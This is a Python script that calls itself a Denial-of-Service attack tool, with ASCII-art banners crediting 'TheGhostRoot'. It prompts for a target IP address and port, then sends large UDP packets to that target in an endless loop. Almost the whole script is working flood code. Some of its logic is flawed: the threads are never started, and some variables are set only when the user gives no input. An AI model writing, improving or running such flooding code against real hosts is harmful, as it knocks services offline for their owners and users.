import threading
import time
import socket
import concurrent.futures
import datetime
import json

ips = {

}

f = ips.values()
g = ips.keys()
h = ips.items()
print(json.dumps(ips, indent=2, sort_keys=True))
print(type(ips))
print(len(ips))
y = datetime.datetime.now()
print("Date:")
print(y)
print("Year:")
print(y.year)
print("Day:")
print(y.strftime("%A"))
print("Month:")
print(y.strftime("%B"))

print("""

#-=======--=======-------#
|Created by TheGhostRoot |
#-------=====-----=====--#

 /$$      /$$           /$$$$$$$   /$$$$$$   /$$$$$$
| $$$    /$$$          | $$__  $$ /$$__  $$ /$$__  $$
| $$$$  /$$$$  /$$$$$$ | $$  \ $$| $$  \ $$| $$  \__/
| $$ $$/$$ $$ /$$__  $$| $$  | $$| $$  | $$|  $$$$$$
| $$  $$$| $$| $$  \__/| $$  | $$| $$  | $$ \____  $$
| $$\  $ | $$| $$      | $$  | $$| $$  | $$ /$$  \ $$
| $$ \/  | $$| $$      | $$$$$$$/|  $$$$$$/|  $$$$$$/
|__/     |__/|__/      |_______/  \______/  \______/

+-----===========--========------+
| Denial-of-Service (DoS) attack |
+---====------==================-+

""")

ip = input("[+} Target IP: ")
print(" <+> This is the target IP " + ip + ' <+> ')
port = input("[+} Target open port: ")
print(' <+> Open port is ' + port + ' <+> ')
porti = int(port)
th = input("[+} Enter the threads (defalt 200) : ")
if th == '':
    th = str('200')
    print(' <+> Threads are ' + th + ' <+> ')
    thi = int(th)
by = input('[+} Enter bytes (defalt max: 65501): ')
if by == '':
    by = str('65501')
    print(' <+> Bytes are ' + by + ' <+> ')
    byi = int(by)
time.sleep(1)

print("""

 /$$   /$$                     /$$       /$$
| $$  | $$                    | $$      |__/
| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$ /$$ /$$$$$$$   /$$$$$$
| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/| $$| $$__  $$ /$$__  $$
| $$__  $$  /$$$$$$$| $$      | $$$$$$/ | $$| $$  \ $$| $$  \ $$
| $$  | $$ /$$__  $$| $$      | $$_  $$ | $$| $$  | $$| $$  | $$
| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$| $$| $$  | $$|  $$$$$$$
|__/  |__/ \_______/ \_______/|__/  \__/|__/|__/  |__/ \____  $$
                                                       /$$  \ $$
                                                      |  $$$$$$/
                                                       \______/

""")

def dos(packet):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    x = 0
    sent = 0
    while True:
        client.sendto(packet, (ip, porti))
        x += byi
        sent += 1
        txt = " <-> Sended {} packets, bytes sended {} to {} : {} <-> "
        print(txt.format(sent, x, ip, porti))

for i in range(thi):
    threading.Thread(target=dos)
dos(bytearray(byi))
